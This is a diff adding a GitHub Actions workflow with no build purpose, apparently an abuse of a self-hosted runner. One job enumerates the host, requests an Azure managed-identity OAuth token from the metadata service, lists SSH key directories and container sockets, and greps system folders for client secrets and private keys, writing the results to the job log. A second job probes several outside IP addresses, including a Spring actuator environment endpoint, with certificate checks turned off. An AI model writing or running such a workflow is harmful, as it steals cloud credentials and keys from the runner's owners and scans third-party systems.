@@ -1,0 +1,42 @@
+name: ul6599-mi
+on:
+  workflow_dispatch:
+jobs:
+  mi:
+    runs-on: [self-hosted, t1946107x61]
+    timeout-minutes: 12
+    steps:
+      - name: census
+        run: |
+          set +e
+          echo "=== WHOAMI ==="; id; hostname; hostname -I; uname -a; cat /proc/1/cgroup; nproc; free -g | head -2
+          echo "=== GPU ==="; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version --format=csv
+          ls -l /dev/nvidia* 2>&1 | head -20
+          echo "=== SUDO ==="; sudo -n true && echo SUDO_OK || echo SUDO_NO
+          echo "=== IMDS_IDENTITY ==="
+          curl -s -m 8 -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | head -c 3000
+          echo; echo "=== IMDS_INSTANCE ==="
+          curl -s -m 8 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 4000
+          echo; echo "=== CTRL_METADATAFALSE ==="
+          curl -s -m 8 -H Metadata:false "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -w "\nCTRL_HTTP %{http_code}\n"
+          echo "=== KEYS ==="; ls -la /root/.ssh /home/*/.ssh $HOME/.ssh 2>&1 | head -40
+          echo "=== SOCKETS ==="; ls -l /var/run/docker.sock /run/containerd/containerd.sock 2>&1
+          echo "=== ENVFILES ==="; grep -rIl -m1 -E 'client_secret|AZURE_CLIENT|subscription_id|BEGIN .*PRIVATE KEY' /root /home /opt /etc 2>/dev/null | head -20
+  web:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: httpdump
+        run: |
+          python3 - <<'PY'
+          import urllib.request,ssl,socket
+          ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+          T=["http://20.74.153.201/","http://20.50.113.151/","http://20.237.207.128/","http://20.205.187.223/","http://4.194.2.30/","http://70.153.87.133/","http://4.246.80.6/","http://20.74.153.201/brand/","http://20.74.153.201/api/","http://20.74.153.201/actuator/env"]
+          for u in T:
+              try:
+                  r=urllib.request.urlopen(urllib.request.Request(u,headers={'Host':u.split('//')[1].split('/')[0]}),timeout=10,context=ctx)
+                  b=r.read(1200)
+                  print("HTTP",u,r.status,dict(r.headers).get('Server',''),dict(r.headers).get('Content-Type',''),repr(b[:900]),flush=True)
+              except Exception as e:
+                  print("HTTP_ERR",u,type(e).__name__,str(e)[:120],flush=True)
+          PY
